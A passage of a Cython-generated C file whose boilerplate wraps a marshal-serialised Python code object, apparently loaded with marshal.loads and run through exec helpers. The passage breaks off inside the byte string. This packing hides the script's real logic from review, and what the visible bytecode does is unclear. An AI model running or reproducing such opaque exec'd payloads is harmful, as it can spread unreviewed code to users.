  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_c_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d_Z_d[] = "c\000\000\000\000\000\000\000\000\000\000\000\000\010\000\000\000\000\000\000\000\363\022\005\000\000\227\000d\000Z\000d\001Z\001d\002Z\002d\003Z\003d\004Z\004d\005Z\005d\004Z\006d\006Z\007d\007Z\010d\010Z\td\td\nl\nZ\nd\td\nl\013Z\013d\013Z\014d\014\204\000Z\r\002\000e\r\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\td\nl\nZ\nd\rZ\016d\016Z\017\002\000e\020e\000\233\000d\017\235\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\021e\021\240\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000s\013\002\000e\023d\020\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\nj\024\000\000\000\000\000\000\000\000e\016d\021e\017i\001d\022e\021i\001\254\023\246\003\000\000\253\003\000\000\000\000\000\000\000\000\240\025\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Z\026e\026\240\024\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\024\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\025k\003\000\000\000\000r\013\002\000e\023d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\td\nl\027Z\027d\td\nl\nZ\nd\td\027l\nm\024Z\024\001\000d\td\nl\030Z\030d\td\nl\031Z\031d\td\nl\nZ\nd\td\nl\025Z\025d\td\nl\032Z\032d\td\nl\033Z\033d\td\030l\034m\035Z\035\001\000d\td\nl\036Z\036d\td\nl\013Z\013d\td\nl\037Z\037d\td\nl Z d\td\031l!m\"Z\"\001\000d\td\032l#m$Z$m%Z%\001\000d\td\nl\027Z\027d\td\nl&Z&d\td\033l'm(Z(\001\000d\td\034l)m*Z*\001\000n\035#\000\001\000\002\000e\027j+\000\000\000\000\000\000\000\000d\035\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\td\034l)m*Z*\001\000Y\000n\003x\003Y\000w\001d\td\036l\037m\037Z\037\001\000d\td\037l\033m,Z,\001\000d\td 